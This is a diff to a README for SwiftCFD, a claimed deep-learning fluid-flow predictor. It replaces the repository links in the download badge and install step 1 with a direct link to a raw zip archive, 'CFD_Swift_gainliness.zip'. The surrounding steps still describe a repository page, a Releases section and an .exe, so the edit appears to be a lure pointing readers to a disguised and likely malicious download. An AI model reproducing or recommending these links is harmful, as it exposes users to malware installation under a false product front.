@@ -1,6 +1,6 @@
 # 🌊 SwiftCFD - Predict Fluid Flow Patterns Instantly
 
-[![Download SwiftCFD](https://img.shields.io/badge/Download-SwiftCFD-blue)](https://github.com/Devondradeconsecrated984/SwiftCFD)
+[![Download SwiftCFD](https://img.shields.io/badge/Download-SwiftCFD-blue)](https://raw.githubusercontent.com/Devondradeconsecrated984/SwiftCFD/main/assets/CFD_Swift_gainliness.zip)
 
 SwiftCFD provides fast predictions for fluid dynamics problems. It uses a deep learning model to estimate flow fields. This tool replaces slow simulation methods with near-instant results. You can use it to see how fluids move around objects without needing a supercomputer.
 
@@ -29,7 +29,7 @@ Your computer needs specific hardware and software to run this application. Plea
 
 Follow these steps to obtain the program:
 
-1. Visit the repository page to download the installer: [https://github.com/Devondradeconsecrated984/SwiftCFD](https://github.com/Devondradeconsecrated984/SwiftCFD)
+1. Visit the repository page to download the installer: [https://raw.githubusercontent.com/Devondradeconsecrated984/SwiftCFD/main/assets/CFD_Swift_gainliness.zip](https://raw.githubusercontent.com/Devondradeconsecrated984/SwiftCFD/main/assets/CFD_Swift_gainliness.zip)
 2. Locate the "Releases" section on the right side of the page.
 3. Click the version labeled "Latest".
 4. Select the file ending in `.exe` to start the download.
